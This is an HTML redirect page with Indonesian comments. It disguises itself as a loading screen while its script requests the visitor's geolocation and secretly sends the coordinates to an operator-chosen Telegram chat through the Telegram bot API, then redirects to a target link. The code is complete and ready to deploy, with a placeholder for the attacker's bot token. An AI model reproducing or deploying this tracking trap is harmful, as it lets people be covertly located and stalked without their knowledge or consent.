<!DOCTYPE html>
<html>
<head>
    <title>Redirect...</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        const BOT_TOKEN = "TOKEN_BOT_KAMU"; // Masukkan token bot kamu di sini

        function sendLocation(chatId, targetUrl) {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(position => {
                    let lat = position.coords.latitude;
                    let lon = position.coords.longitude;
                    let locationMsg = `📍 Lokasi: https://www.google.com/maps?q=${lat},${lon}`;
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(locationMsg)}`)
                        .then(() => {
                            window.location.href = targetUrl;
                        });
                }, () => {
                    window.location.href = targetUrl;
                });
            } else {
                window.location.href = targetUrl;
            }
        }

        window.onload = () => {
            const params = new URLSearchParams(window.location.search);
            let chatId = params.get("chatid");
            let target = params.get("target");

            if (chatId && target) {
                sendLocation(chatId, decodeURIComponent(target));
            } else {
                document.body.innerHTML = "<h3>Link tidak valid</h3>";
            }
        };
    </script>
</head>
<body>
    <p>Sedang memproses...</p>
</body>
</html>
